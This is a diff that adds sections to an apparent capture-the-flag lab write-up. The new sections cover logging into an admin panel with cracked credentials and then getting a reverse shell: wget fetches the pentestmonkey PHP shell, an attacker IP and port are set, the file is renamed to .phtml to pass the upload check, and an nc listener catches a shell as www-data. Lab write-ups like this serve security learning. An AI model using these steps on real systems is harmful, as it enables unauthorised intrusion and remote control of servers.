@@ -79,3 +79,51 @@ Cracked MD5 hash:
 ```
 
 ---
+
+## 🔐 Gaining Access
+
+Logged in at:
+
+```
+http://10.10.187.142/content/as
+```
+
+With credentials:
+
+```
+Username: manager
+Password: Password123
+```
+
+---
+
+## 🐚 Reverse Shell
+
+1. Downloaded reverse shell:
+
+```bash
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+```
+
+2. Edited IP and port:
+
+```php
+$ip = '10.11.0.5';  // Attacker IP
+$port = 4444;
+```
+
+3. Renamed and uploaded via admin panel:
+
+```bash
+mv php-reverse-shell.php shell.phtml
+```
+
+4. Set up listener:
+
+```bash
+nc -lvnp 4444
+```
+
+5. Triggered shell → Connected as `www-data`
+
+---
